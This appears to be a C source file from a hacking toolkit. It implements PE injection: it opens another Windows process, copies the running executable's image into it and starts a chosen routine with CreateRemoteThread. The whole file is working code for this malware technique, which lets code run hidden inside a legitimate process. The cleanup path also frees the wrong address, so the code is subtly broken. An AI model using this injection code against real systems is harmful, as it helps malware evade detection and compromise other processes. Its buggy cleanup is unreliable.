#include "hackProc.h"
/**
 * Inject and start current module in the target process
 * @param pid Target process ID
 * @param start callRoutine Function we want to call in distant process
 */
BOOL peInjection( pid_t pid, LPTHREAD_START_ROUTINE callRoutine )
{
  HANDLE proc, thread;
  HMODULE module, injectedModule;
  BOOL result = FALSE;

  /* Open distant process. This will fail if UAC activated and proces running with higher integrity control level */
  proc = OpenProcess( PROCESS_CREATE_THREAD |
                      PROCESS_QUERY_INFORMATION |
                      PROCESS_VM_OPERATION |
                      PROCESS_VM_WRITE |
                      PROCESS_VM_READ,
                      FALSE,
                      pid );

  if ( proc != NULL )
  {
    /* Get image of current process modules memory*/
    /* Note: This will return handle to  memory content of current module, which means current exe (we do not load any other module).  */
    module = GetModuleHandle( NULL );
    /* Insert module image in target process*/
    injectedModule = ( HMODULE )injectModule( proc, module );

    /* injectedModule is the base address of the injected module in the target process */
    if ( injectedModule != NULL )
    {
      /* Calculate the address of routine we want to call in the target process */
      /* The new address is:
       Start address of copied image in target process + Offset of routine in copied image */
      LPTHREAD_START_ROUTINE remoteThread = ( LPTHREAD_START_ROUTINE )( (
                                              LPBYTE )injectedModule + ( DWORD_PTR )( ( LPBYTE )callRoutine -
                                                  ( LPBYTE )module ) );
      /* Call the distant routine in a remote thread  */
      thread = CreateRemoteThread( proc, NULL, 0, remoteThread, NULL, 0, NULL );

      if ( thread != NULL )
      {
        CloseHandle( thread );
        result = TRUE;
      }
      else
      {
        /* If failed, release memory */
        VirtualFreeEx( proc, module, 0, MEM_RELEASE );
      }
    }

    CloseHandle( proc );
  }

  return result;
}
